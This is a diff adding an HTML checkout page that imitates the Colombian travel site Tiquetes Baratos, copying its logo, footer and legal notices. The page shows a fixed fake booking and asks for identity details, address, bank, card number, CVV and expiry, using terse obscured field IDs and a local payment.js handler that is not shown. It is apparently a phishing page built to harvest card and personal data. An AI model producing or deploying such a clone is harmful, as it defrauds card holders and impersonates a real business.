@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tiquetes Baratos | Tiquetes, vuelos, hoteles y más</title>
+    <link rel="shortcut icon" href="./assets/svg/logo-tiquetesbaratos.png" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
+        rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jsrsasign/10.1.0/jsrsasign-all-min.js"></script>
+    <!-- SCRIPTS -->
+    <script src="./js/functions.js"></script>
+
+    <!-- CSS -->
+    <link rel="stylesheet" href="./css/datepicker.css">
+    <link rel="stylesheet" href="./css/normalize.css">
+    <link rel="stylesheet" href="./css/tw.css">
+</head>
+
+<body>
+    <div class="modal modal-loader">
+        <span class="loader"></span>
+    </div>
+
+    <!-- NAVBAR -->
+    <nav class="w-full flex flex-row justify-between items-center p-3 mb-2 shadow-md">
+        <img width="60px" src="./assets/svg/logo-tiquetesbaratos.png">
+        <img width="25px" src="./assets/svg/burger_menu.png">
+    </nav>
+
+    <div class="mx-3 my-5 rounded border border-zinc-300 text-center py-3 px-5">
+        <p class="poppins-semibold text-xl text-[#15327F]">Completa tu reservación</p>
+        <p class="text-xs text-[#333]">Guardaremos tu reservación con el localizador <span id="booking-id" class="font-semibold">137764532</span></p>
+    </div>
+
+    <!-- RESUME -->
+    <div class="mx-3 mb-5 rounded border border-zinc-300 overflow-hidden">
+        <div class="flex flex-row items-center justify-between px-3 py-3 border-b border-zinc-300">
+            <p class="font-semibold text-md text-[#C22F0A]">Resumen de tu reservación</p>
+            <img src="./assets/svg/arrow_top_red.png" width="20px">
+        </div>
+        <div class="px-3 border-b border-zinc-300">
+            <div id="resume-flight-go" class="flex flex-col justify-center pl-10 mb-3">
+                <!-- <p class="my-2 text-xs text-[#333] poppins-semibold">Vuelo de ida</p>
+                <div class="flex flex-row items-start gap-7">
+                    <img src="./assets/svg/ltm_logo.png" width="80px">
+                    <div>
+                        <p class="text-sm text-[#333] font-semibold">Bogotá > Santa Marta</p>
+                        <p class="text-sm text-[#333]">22 ene. 2025</p>
+                        <p class="text-xs">Vuelo: Directo</p>
+                        <p class="text-xs">Tarifa: Basic</p>
+                    </div>
+                </div> -->
+            </div>
+            <div id="resume-flight-back" class="flex flex-col justify-center pl-10 mb-3">
+                <!-- <p class="my-2 text-xs text-[#333] poppins-semibold">Vuelo de regreso</p>
+                <div class="flex flex-row items-start gap-7">
+                    <img src="./assets/svg/ltm_logo.png" width="80px">
+                    <div>
+                        <p class="text-sm text-[#333] font-semibold">Santa Marta > Bogotá</p>
+                        <p class="text-sm text-[#333]">27 ene. 2025</p>
+                        <p class="text-xs">Vuelo: Directo</p>
+                        <p class="text-xs">Tarifa: Basic</p>
+                    </div>
+                </div> -->
+            </div>
+        </div>
+        <div class="flex flex-row items-center justify-between px-3 py-3">
+            <p class="poppins-semibold text-md text-[#333]">Total:</p>
+            <p id="resume-total" class="poppins-regular text-md text-[#333]">COP $ 532.380,00</p>
+        </div>
+    </div>
+
+    <!-- PAYMENT -->
+    <form id="form" class="mx-3 mb-5 rounded border border-zinc-300 overflow-hidden px-4 py-4">
+        <p class="mb-3 poppins-semibold text-sm text-[#333]">Ingresa tus datos personales</p>
+
+        <div class="my-4 relative">
+            <label class="label-float-input text-sm text-gray-600">Nombres*</label>
+            <input type="text" id="name" class="w-full py-3 px-3 border rounded outline-none" required>
+        </div>
+        <div class="my-4 relative">
+            <label class="label-float-input text-sm text-gray-600">Apellidos*</label>
+            <input type="text" id="surname" class="w-full py-3 px-3 border rounded outline-none" required>
+        </div>
+        <div class="relative my-2">
+            <label class="label-float-input text-sm text-gray-600">Tipo de documento*</label>
+            <select class="appearance-none w-full p-2 border border-zinc-200 rounded outline-none bg-white text-gray-700 pr-8" required>
+                <option value="" disabled selected hidden>--</option>
+                <option value="">DNI</option>
+                <option value="">CC</option>
+                <option value="">CE</option>
+                <option value="">Pasaporte</option>
+            </select>
+            <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700">
+                <svg class="fill-current h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
+                    <path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z" />
+                </svg>
+            </div>
+        </div>
+        <div class="my-4 relative">
+            <label class="label-float-input text-sm text-gray-600">Número de documento*</label>
+            <input type="number" id="cc" class="w-full py-3 px-3 border rounded outline-none" required>
+        </div>
+        <div class="my-4 relative">
+            <label class="label-float-input text-sm text-gray-600">Ciudad de residencia*</label>
+            <input type="text" id="city" class="w-full py-3 px-3 border rounded outline-none" required>
+        </div>
+        <div class="my-4 relative">
+            <label class="label-float-input text-sm text-gray-600">Dirección*</label>
+            <input type="text" id="address" class="w-full py-3 px-3 border rounded outline-none" required>
+        </div>
+        <div class="my-4 relative">
+            <label class="label-float-input text-sm text-gray-600">Email*</label>
+            <input type="email" id="email" class="w-full py-3 px-3 border rounded outline-none" required>
+        </div>
+        <div class="mt-4 mb-7 relative">
+            <label class="label-float-input text-sm text-gray-600">Teléfono*</label>
+            <input type="text" id="telnum" class="w-full py-3 px-3 border rounded outline-none" required>
+        </div>
+
+        <p class="mb-3 poppins-semibold text-sm text-[#333]">Ingresa los datos de tu tarjeta</p>
+        <img class="mb-4" src="./assets/svg/franquicias.png" width="135px">
+
+        <div id="card-inputs" class="hide">
+            <div class="relative my-4">
+                <label class="label-float-input text-sm text-gray-600">Entidad financiera*</label>
+                <select id="ban" required class="appearance-none w-full px-2 py-5 border border-zinc-200 rounded outline-none bg-white text-gray-700 pr-8">
+                    <option label="BANCAMIA S.A." value="bancamia">BANCAMIA S.A.</option>
+                    <option label="BANCO AGRARIO" value="agrario">BANCO AGRARIO</option>
+                    <option label="BANCO AV VILLAS" value="avvillas">BANCO AV VILLAS</option>
+                    <option label="BANCO BBVA COLOMBIA S.A." value="bbva">BANCO BBVA COLOMBIA S.A.</option>
+                    <option label="BANCO CAJA SOCIAL" value="caja-social">BANCO CAJA SOCIAL</option>
+                    <option label="BANCO COOPERATIVO COOPCENTRAL" value="coopertaivo-coopcentral">BANCO COOPERATIVO COOPCENTRAL</option>
+                    <option label="BANCO CREDIFINANCIERA" value="credifinanciera">BANCO CREDIFINANCIERA</option>
+                    <option label="BANCO DAVIVIENDA" value="davivienda">BANCO DAVIVIENDA</option>
+                    <option label="BANCO DE BOGOTA" value="bogota">BANCO DE BOGOTA</option>
+                    <option label="BANCO DE OCCIDENTE" value="occidente">BANCO DE OCCIDENTE</option>
+                    <option label="BANCO FALABELLA " value="falabella">BANCO FALABELLA </option>
+                    <option label="BANCO FINANDINA S.A. BIC" value="finandina">BANCO FINANDINA S.A. BIC</option>
+                    <option label="BANCO GNB SUDAMERIS" value="sudameris">BANCO GNB SUDAMERIS</option>
+                    <option label="BANCO ITAU" value="itau">BANCO ITAU</option>
+                    <option label="BANCO PICHINCHA S.A." value="pichincha">BANCO PICHINCHA S.A.</option>
+                    <option label="BANCO POPULAR" value="popular">BANCO POPULAR</option>
+                    <option label="BANCO SANTANDER COLOMBIA" value="santander">BANCO SANTANDER COLOMBIA</option>
+                    <option label="BANCO SERFINANZA" value="serfinanza">BANCO SERFINANZA</option>
+                    <option label="BANCO UNION antes GIROS" value="union">BANCO UNION antes GIROS</option>
+                    <option label="BANCOLOMBIA" value="bancolombia" selected>BANCOLOMBIA</option>
+                    <option label="BANCOOMEVA S.A." value="bancomeva">BANCOOMEVA S.A.</option>
+                    <option label="CFA COOPERATIVA FINANCIERA" value="cfa">CFA COOPERATIVA FINANCIERA</option>
+                    <option label="CITIBANK " value="citibank">CITIBANK</option>
+                    <option label="COLTEFINANCIERA" value="coltefinanciera">COLTEFINANCIERA</option>
+                    <option label="CONFIAR COOPERATIVA FINANCIERA" value="confiar">CONFIAR COOPERATIVA FINANCIERA</option>
+                    <option label="COOFINEP COOPERATIVA FINANCIERA" value="coofinep">COOFINEP COOPERATIVA FINANCIERA</option>
+                    <option label="COTRAFA" value="cotrafa">COTRAFA</option>
+                    <option label="DALE" value="dale">DALE</option>
+                    <option label="DAVIPLATA" value="1551">DAVIPLATA</option>
+                    <option label="IRIS" value="iris">IRIS</option>
+                    <option label="LULO BANK" value="lulo">LULO BANK</option>
+                    <option label="MOVII S.A." value="movii">MOVII S.A.</option>
+                    <option label="NUBANK" value="nubank">NUBANK</option>
+                    <option label="NEQUI" value="nequi">NEQUI</option>
+                    <option label="RAPPIPAY" value="rappipay">RAPPIPAY</option>
+                    <option label="RAPPIPAY DAVIPLATA" value="rappipay">RAPPIPAY DAVIPLATA</option>
+                    <option label="SCOTIABANK COLPATRIA" value="scotiabank-colpatria">SCOTIABANK COLPATRIA</option>
+                </select>
+                <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700">
+                    <svg class="fill-current h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
+                        <path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z" />
+                    </svg>
+                </div>
+            </div>
+
+            <div class="my-2 relative">
+                <label class="label-float-input text-sm text-gray-600">Número de tarjeta*</label>
+                <input type="text" required oninput="formatCNumber(this)" id="p" class="w-full py-3 px-3 border rounded outline-none">
+            </div>
+
+            <div class="flex flex-row justify-between items-center gap-3">
+                <div class="my-4 relative">
+                    <label class="label-float-input text-sm text-gray-600">CVV*</label>
+                    <input id="c" required type="number" required oninput="limitDigits(this, 3)" class="w-full py-3 px-3 border rounded outline-none">
+                </div>
+                <div class="my-4 relative">
+                    <label class="label-float-input text-sm text-gray-600">Fecha vencimiento*</label>
+                    <input type="text" oninput="formatDate(this)" id="pdate" required class="w-full py-3 px-3 border rounded outline-none">
+                </div>
+            </div>
+
+            <!-- NEXT STEP -->
+            <div class="mb-4">
+                <button type="submit" class="block w-full text-sm rounded py-4 bg-[#DC3004] poppins-semibold text-white text-center">
+                    Pagar
+                </button>
+            </div>
+        </div>
+    </form>
+
+    <div class="mx-3 mb-5 flex flex-row items-start gap-3 bg-[#FAFAFA] rounded border border-zinc-300 overflow-hidden">
+        <div class="h-[170px] w-[15px] bg-[#87d6f7]"></div>
+        <img class="mt-3" src="./assets/svg/lock_icon.png" width="50px">
+        <div class="mt-3">
+            <p class="mb-2 pr-2 poppins-semibold text-sm text-[#1a4e11]">Tus compras con Tiquetes Baratos son 100% seguras.</p>
+            <p class="pr-10 text-md text-[#333]">Reserva con confianza. Toda tu información personal viaja protegida por nuestros servidores seguros.</p>
+        </div>
+    </div>
+
+
+    <footer class="bg-[#003b98] px-5 py-10 text-white flex flex-col items-center">
+        <img width="100px" src="./assets/svg/tb_icon.png">
+        <div class="mb-4">
+            <p class="mb-2">Síguenos en nuestras redes</p>
+            <img width="130px" src="./assets/svg/redes_icon.png">
+            <p class="mt-2 mb-1">Comunicate con nosotros</p>
+            <img width="90px" src="./assets/svg/canales_icon.png">
+        </div>
+        <div class="w-full">
+            <div class="w-full py-3 flex flex-row justify-between items-center" style="border-bottom: 1px solid #fff;">
+                <p>Aerolineas destacadas</p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+                    class="bi bi-chevron-down" viewBox="0 0 16 16">
+                    <path fill-rule="evenodd"
+                        d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z" />
+                </svg>
+            </div>
+            <div class="w-full py-3 flex flex-row justify-between items-center" style="border-bottom: 1px solid #fff;">
+                <p>Los más vistos</p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+                    class="bi bi-chevron-down" viewBox="0 0 16 16">
+                    <path fill-rule="evenodd"
+                        d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z" />
+                </svg>
+            </div>
+            <div class="w-full py-3 flex flex-row justify-between items-center" style="border-bottom: 1px solid #fff;">
+                <p>Sobre tiquetesbaratos.com</p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+                    class="bi bi-chevron-down" viewBox="0 0 16 16">
+                    <path fill-rule="evenodd"
+                        d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z" />
+                </svg>
+            </div>
+            <div class="w-full py-3 flex flex-row justify-between items-center" style="border-bottom: 1px solid #fff;">
+                <p>Recursos</p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+                    class="bi bi-chevron-down" viewBox="0 0 16 16">
+                    <path fill-rule="evenodd"
+                        d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z" />
+                </svg>
+            </div>
+        </div>
+        <p class="text-sm text-center mt-10">TiquetesBaratos - PRICE RES S.A.S. NIT. 900.474.794-8 , Calle 97A # 8-10 Of
+            204, Bogotá D.C., Bogotá – Colombia, Teléfonos: 601 743 0044. Todos los derechos reservados.Registro
+            Nacional de Turismo No. 44091. soportepqrco@pricetravel.com</p>
+        <p class="text-sm text-center mt-10">En desarrollo de lo dispuesto en el artículo 17 de la ley 679 de 2001, la
+            agencia rechaza la explotación, la pornografía, el turismo sexual y demás formas de abuso sexual con
+            menores, que son sancionados penal y administrativamente conforme a las leyes colombianas.</p>
+    </footer>
+
+    <!-- SCRIPTS -->
+    <script src="./js/payment.js"></script>
+</body>
+
+</html>
